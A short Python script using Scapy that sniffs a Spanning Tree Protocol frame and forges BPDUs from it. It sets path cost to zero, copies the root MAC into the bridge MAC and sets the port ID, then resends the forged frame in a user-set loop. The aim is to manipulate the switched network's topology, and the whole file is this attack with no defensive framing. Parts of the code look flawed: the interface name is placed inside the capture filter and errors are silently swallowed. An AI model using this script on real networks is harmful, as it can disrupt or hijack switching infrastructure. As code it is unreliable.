from scapy.all import *
from time import sleep
import re



interface = str(input("[+] Enter the interface: \n"))

mac_address = input('[+] Enter device MAC address: ')
isvalid = re.match('(?=[a-f0-9]{2}:){5}[a-f0-9]{2}', mac_address, re.I)

if isvalid:
    packet = sniff(filter=f"{interface} dst {mac_address}", count=1)
    try:
        print("[+] Packet Captured Successfully\n", packet[0].show())
        print("[+] 802.3 Ethernet \n", packet[0][0].show())
        print("[+] Logic Link Control \n", packet[0][1].show())
        print("[+] Spanning Tree Protocol \n", packet[0][2].show())
        # Blocking the port to root with setting cost to root 0
        packet[0].pathcost = 0
        # set root MAC to Bridge MAC
        packet[0].bridgemac = packet[0].rootmac
        packet[0].portid = 1
        max_value = int(input("[+] Enter number of loop to run"))

        # loop to send multiple BPDUs
        for i in range(0, max_value):
            print("[+] Packet Manipulated Successfully\n", packet[0].show())
            sendp(packet[0], loop=0, verbose=1)
            sleep(1)
    except:
        print("[-] Error occurred")
else:
    print("[-] MAC Address is invalid")

